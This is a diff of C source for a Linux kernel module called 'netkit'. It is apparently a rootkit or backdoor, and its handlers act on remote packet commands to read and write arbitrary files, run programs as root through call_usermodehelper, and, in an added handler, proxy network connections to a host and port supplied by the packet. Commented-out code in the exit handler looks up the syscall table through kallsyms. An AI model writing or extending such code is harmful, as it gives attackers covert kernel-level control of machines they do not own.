@@ -2,77 +2,22 @@
 #include <linux/module.h>
 #include <linux/fcntl.h>
 #include <linux/fs.h>
+#include <linux/inet.h>
+#include <linux/net.h>
+#include <linux/syscalls.h>
 
 #include "handlers.h"
+
 #include "../packet/packet.h"
 #include "../../mem/mngt.h"
+#include "../../sys/socket.h"
+#include "../../sys/file.h"
+#include "../../netkit.h"
+#include "../../sys/kernel.h"
 
 int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
-    struct file *file;
-    char *tmp_buf;
-    int retv = 0;
-
-    file = filp_open(packet->content, O_RDONLY, 0);
-    if (IS_ERR(file))
-    {
-        pr_err("[!] failed to open file\n");
-        return PTR_ERR(file);
-    }
-
-    tmp_buf = kzmalloc(4096, GFP_KERNEL);
-    if (IS_ERR(tmp_buf))
-    {
-        retv = PTR_ERR(tmp_buf);
-        goto LAB_OUT_NO_FILP;
-    }
-
-    pr_err("[*] reading file (%p, %p)...\n", file, tmp_buf);
-    retv = kernel_read(file, tmp_buf, 4096, NULL);
-    if (retv < 0)
-    {
-        pr_err("[!] failed to read file\n");
-        goto LAB_OUT;
-    }
-
-    *res_buflen = retv;
-    *res_buf = kzmalloc(retv, GFP_KERNEL);
-    if (IS_ERR(*res_buf))
-    {
-        retv = PTR_ERR(*res_buf);
-        *res_buf = NULL;
-        *res_buflen = 0;
-
-        goto LAB_OUT;
-    }
-
-    memcpy(*res_buf, tmp_buf, *res_buflen);
-
-    while (retv == 4096)
-    {
-        pr_err("[*] reading file...\n");
-        retv = kernel_read(file, tmp_buf, 4096, NULL);
-    
-        kzrealloc(*res_buf, *res_buflen, *res_buflen + retv);
-        memcpy(*res_buf + *res_buflen, tmp_buf, retv);
-        *res_buflen += retv;
-        
-        if (retv < 0)
-        {
-            pr_err("[!] failed to read file\n");
-            goto LAB_OUT;
-        }
-    }
-
-LAB_OUT:
-    filp_close(file, NULL);
-LAB_OUT_NO_FILP:
-    kzfree(tmp_buf, 4096);
-
-    if (retv >= 0)
-        return 0;
-
-    return retv;
+    return file_read(packet->content, res_buf, res_buflen);
 }
 
 int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
@@ -101,7 +46,6 @@ int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_
     return 0;
 }
 
-
 int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
     char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
@@ -114,4 +58,71 @@ int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_b
     argv[0] = content_mod;
 
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+{
+    static struct socket *sock;
+    struct sockaddr_in *addr;
+    int retv = 0;
+
+    if (packet->content_len < 6)
+        return -EMSGSIZE;
+
+    retv = socket_create(*(__be32*)packet->content, *(unsigned short*)(packet->content+4), &sock, &addr);
+    if (retv < 0)
+        return retv;
+    
+    retv = socket_connect(sock, addr);
+    if (retv < 0)
+        goto LAB_OUT;
+    
+    retv = socket_write(sock, packet->content+6, packet->content_len-6);
+    if (retv < 0)
+        goto LAB_OUT;
+
+    retv = socket_read(sock, res_buf, res_buflen);
+
+LAB_OUT:
+    sock_release(sock);
+    kzfree(addr, sizeof(*addr));
+    
+    return retv;
+}
+
+asmlinkage long sys_delete_module(const char __user *, unsigned int);
+int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+{
+    //module_put(netkit_module);
+    //netkit_module->exit();
+
+    // Locate the address of the delete_module syscall using kallsyms.
+    /*void **syscall_table = (void**)kallsyms_lookup_name("sys_call_table");
+
+    // Backup the original delete_module syscall function.
+    int (*sys_delete_module)(const char*, unsigned int) = sys_call_table[__NR_delete_module];*/
+
+    /*unsigned long *sys_call_table;
+
+    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    if (!sys_call_table) {
+        printk(KERN_ERR "Failed to find the syscall table address.\n");
+        return -ENXIO;
+    }
+
+    printk(KERN_INFO "Syscall table address: %p\n", sys_call_table);
+
+    // Access individual syscalls using the syscall table.
+    // For example, to access the delete_module syscall:
+    sys_delete_module = (void *)sys_call_table[__NR_delete_module];*/
+
+    //sys_delete_module(netkit_module->name, 0);
+    //syscall(__NR_delete_module, netkit_module->name, 0);
+    get_kallsyms();
+    //void* sys_call_table = get_sys_call_table();
+    //pr_err("[*] sys_call_table: %p\n", sys_call_table);
+
+    return 0;
+
+    //return sys_delete_module(netkit_module->name, 0);
 }
